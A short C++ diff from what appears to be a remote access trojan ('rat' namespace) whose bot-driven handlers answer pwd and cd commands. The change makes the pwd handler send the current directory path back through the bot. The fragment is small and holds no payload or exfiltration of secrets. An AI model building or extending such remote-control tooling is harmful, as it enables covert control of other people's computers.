@@ -8,7 +8,9 @@
 namespace rat::handler {
 
 void Handler::handlePwdCommand() {
-    this->bot->sendMessage(rat::system::pwd());
+    const auto& current_path = std::filesystem::current_path();
+    this->bot->sendMessage(current_path.string());
+    return;
 }
 
 void Handler::handleCdCommand() {
